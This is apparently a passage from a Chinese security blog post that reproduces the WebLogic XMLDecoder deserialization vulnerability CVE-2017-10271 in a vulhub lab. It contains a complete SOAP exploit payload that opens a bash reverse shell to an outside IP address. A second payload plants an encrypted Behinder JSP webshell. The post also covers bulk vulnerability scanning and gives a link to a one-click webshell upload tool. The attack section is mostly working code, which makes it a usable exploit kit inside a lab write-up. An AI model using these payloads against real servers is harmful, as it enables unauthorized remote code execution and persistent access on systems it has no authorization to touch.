<p>WebLogic XMLDecoder反序列化漏洞利用Java的反序列化机制，攻击者可以发送恶意的序列化数据，使WebLogic Server反序列化执行恶意代码。</p> 
<h6><a id="_303"></a>漏洞原理：</h6> 
<p>WLS-WSAT 是 WebLogic Server 事务管理（WebLogic Server Transaction）的一个组件，它使用Java的反序列化机制来处理数据，调用 XMLDecoder类 将用户传入的XML数据转换为Java对象。</p> 
<p>在某些情况下攻击者可以构造恶意的序列化数据作为HTTP POST请求的一部分发送到WebLogic Server的T3协议端口（默认为7001），并且在请求头中设置一个特殊的“Content-Type”值来触发漏洞。当WebLogic Server处理该请求时，XMLDecoder将恶意的序列化数据反序列化为Java对象，并执行其中包含的恶意代码。</p> 
<h6><a id="_307"></a>影响版本：</h6> 
<p>10.3.6.0.0、12.1.3.0.0、12.2.1.1.0、12.2.1.2.0</p> 
<h6><a id="_309"></a>环境搭建：</h6> 
<p>进入对应目录：</p> 
<pre><code class="prism language-php">vulhub<span class="token operator">/</span>weblogic<span class="token operator">/</span><span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">10271</span>
</code></pre> 
<p>启动环境：</p> 
<pre><code class="prism language-shell"><span class="token function">docker-compose</span> up -d
</code></pre> 
<p><img src="https://images2.imgbox.com/f4/67/9kU4dTsO_o.png" alt="在这里插入图片描述"></p> 
<h6><a id="_321"></a>复现过程：</h6> 
<p>访问 <code>/wls-wsat/CoordinatorPortType</code> 目录，如果出现如下页面，就有可能存在漏洞。<br> <img src="https://images2.imgbox.com/02/ce/zzQXOS27_o.png" alt="在这里插入图片描述"><br> 对该页面进行抓包，修改请求方式为<code>POST</code>，添加请求字段 <code>Content-Type:text/xml</code>，然后后添加如下poc</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/192.168.50.131/2333 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>其中反弹命令</p> 
<pre><code class="prism language-xml">bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/192.168.50.131/2333 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1
</code></pre> 
<p>是经过 html 实体编码的，不然解析XML的时候将出现格式错误。</p> 
<p><img src="https://images2.imgbox.com/09/81/m0utQ5Fl_o.png" alt="在这里插入图片描述"><br> 成功获取到 shell<br> <img src="https://images2.imgbox.com/94/7a/VwtmHeuu_o.png" alt="在这里插入图片描述"></p> 
<p>还可以上传个webshell，这里使用的冰蝎的一句话，poc如下：</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.io.PrintWriter<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>println<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>
     <span class="token cdata">&lt;![CDATA[
&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
     ]]&gt;</span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>close<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p><img src="https://images2.imgbox.com/b6/18/o3rflXSa_o.png" alt="在这里插入图片描述"><br> 访问链接为：http:/192.168.50.131:7001/bea_wls_internal/shell.jsp</p> 
<p><img src="https://images2.imgbox.com/35/54/i1VMhpjC_o.png" alt="在这里插入图片描述"><br> 成功连接！</p> 
<hr>🆗，本次的 Weblogic 漏洞暂时就复现这几个，下面推荐几个好用的漏洞检测和利用工具。 
<h4><a id="0x03__388"></a>0x03 工具利用</h4> 
<p>WebLogic-Scan：是一款用于扫描和检测 WebLogic 漏洞的开源工具。该工具可以扫描 WebLogic 服务器上的常见漏洞，发现漏洞后攻击者需要使用其他工具或手动方法来利用漏洞，执行攻击。<a href="https://github.com/rabbitmask/WeblogicScan">下载链接</a></p> 
<p><img src="https://images2.imgbox.com/69/0a/ZhgHOrat_o.png" alt="在这里插入图片描述"></p> 
<p>有两种使用方式：</p> 
<ol><li>指定IP地址和端口</li></ol> 
<pre><code class="prism language-python">python WeblogicScan<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token number">192.168</span><span class="token number">.50</span><span class="token number">.131</span> <span class="token operator">-</span>p <span class="token number">7001</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/22/ab/TEV9XKVb_o.png" alt="在这里插入图片描述"><br> 图中的 <code>+</code> 代表存在漏洞，<code>-</code> 表示没有。</p> 
<ol start="2"><li>批量读取 txt 文件进行扫描：</li></ol> 
<pre><code class="prism language-python">python WeblogicScan<span class="token punctuation">.</span>py <span class="token operator">-</span>f target<span class="token punctuation">.</span>txt
</code></pre> 
<p>当不指定ip时会默认扫描 7001 端口。<br> <img src="https://images2.imgbox.com/09/9b/9SJdfjIn_o.png" alt="在这里插入图片描述"><br> 检测出漏洞后，可以配合下面这个工具进行进一步的利用。<a href="https://pan.baidu.com/s/1ducp2WdG5ffOt3eJP2n2AQ?pwd=1111" rel="nofollow">工具下载</a></p> 
<p><img src="https://images2.imgbox.com/32/3b/7zOLpcWF_o.png" alt="在这里插入图片描述"><br> 一键上传小马</p> 
<p><img src="https://images2.imgbox.com/cf/b5/sV0GS4kZ_o.png" alt="在这里插入图片描述"><br> 成功连接<br> <img src="https://images2.imgbox.com/16/4c/zNB0Zjvf_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/27bf3f2ed47bdb6a1332b64fb219ec21/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">如何排查线上环境CPU100%问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0e3200abc34a702d74b536ca952bd919/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">RT-Thread线程管理以及内核裁剪</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>